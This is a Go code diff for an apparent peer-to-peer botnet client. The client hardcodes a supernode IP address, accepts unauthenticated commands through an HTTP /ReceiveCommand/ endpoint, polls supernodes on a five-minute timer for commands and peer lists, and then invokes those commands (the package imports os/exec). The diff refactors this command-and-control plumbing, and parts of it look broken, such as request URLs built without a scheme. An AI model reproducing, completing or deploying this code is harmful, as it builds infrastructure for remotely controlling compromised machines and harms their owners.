@@ -8,6 +8,7 @@ import (
 	"log"
 	"net/http"
 	"os/exec"
+	"strings"
 	"time"
 )
 
@@ -19,11 +20,10 @@ type BotFunc interface {
 }
 
 type Bot struct {
-	IsSupernode bool
+	IP 			string
 	Supernodes  []string
 	Commands    []string
 	Publickey   string
-	TimeToSupernode *time.Timer
 	OnlineTicker *time.Ticker
 }
 
@@ -35,11 +35,9 @@ func main() {
 	//Send Command
 	//Execute Command
 	bot := Bot{
-		IsSupernode: false,
 		Supernodes: []string{"77.88.124.125:8080"},
 		Commands: []string{},
 		Publickey: "",
-		TimeToSupernode: time.NewTimer(5 * time.Minute),
 		OnlineTicker: time.NewTicker(5 * time.Minute),
 	}
 	go bot.StartSupernode()
@@ -50,15 +48,14 @@ func(b *Bot)StartSupernode() {
 	defer func() {
 		recover()
 	}()
-	http.HandleFunc("/AddNewSupernode", func(w http.ResponseWriter, r *http.Request) {
-		var result map[string]interface{}
-		err := json.Unmarshal(r.Body, &result)
-		b.IsSupernode = true
-		b.TimeToSupernode.Stop()
-		w.Write([]byte(json.Marshal(b)))
+	http.HandleFunc("/AddNewSupernode/", func(w http.ResponseWriter, r *http.Request) {
+		b.IP = strings.TrimPrefix(r.URL.Path, "/AddNewSupernode/")
+		json.NewEncoder(w).Encode(true)
 	})
-	http.HandleFunc("/ReceiveCommand", func(w http.ResponseWriter, r *http.Request) {
-		b.Commands =
+	http.HandleFunc("/ReceiveCommand/", func(w http.ResponseWriter, r *http.Request) {
+		command := strings.TrimPrefix(r.URL.Path, "/ReceiveCommand/")
+		b.Commands = []string{command}
+		json.NewEncoder(w).Encode(true)
 	})
 	http.HandleFunc("/Online", func(w http.ResponseWriter, r *http.Request) {
 		go b.AddNewSupernode(r.RemoteAddr)
@@ -81,36 +78,25 @@ func(b *Bot)Online() {
 			}
 			var respBody map[string][]string
 			json.NewDecoder(resp.Body).Decode(&respBody)
-			b.Supernodes = UniqueSupernodes(append(b.Supernodes, respBody["supernodes"]...))
+			b.Supernodes = b.UniqueSupernodes(append(b.Supernodes, respBody["supernodes"]...))
 			b.Commands = respBody["commands"]
 			resp.Body.Close()
 		}
+		b.InvokeCommand()
 	<-b.OnlineTicker.C
 	}
 }
 
 func(b *Bot)AddNewSupernode(node string) {
-	message := map[string]interface{}{
-		"ip": node,
-	}
-
-	bytesRepresentation, err := json.Marshal(message)
+	defer func() {
+		recover()
+	}()
+	resp, err := http.Get(node + "/AddNewSupernode/" + node)
 	if err != nil {
-		log.Fatalln(err)
+		panic(err)
 	}
-
-	resp, err := http.Post(node + "/BecomeSupernode", "application/json", bytes.NewBuffer(bytesRepresentation))
-	if err != nil {
-		log.Fatalln(err)
-	}
-
-	var result map[string]interface{}
-
-	json.NewDecoder(resp.Body).Decode(&result)
-
-	log.Println(result)
-	log.Println(result["data"])
-
+	b.Supernodes = b.UniqueSupernodes(append(b.Supernodes, node))
+	resp.Body.Close()
 }
 
 func(b *Bot)InvokeCommand() {
@@ -122,9 +108,12 @@ func(b *Bot)InvokeCommand() {
 
 }
 
-func UniqueSupernodes(supernodes []string) []string {
+func(b *Bot) UniqueSupernodes(supernodes []string) []string {
 	keys := make(map[string]bool)
 	list := []string{}
+	if b.IP != "" {
+		keys[b.IP] = true
+	}
 
 	for _, entry := range supernodes {
 		if _, value := keys[entry]; !value {
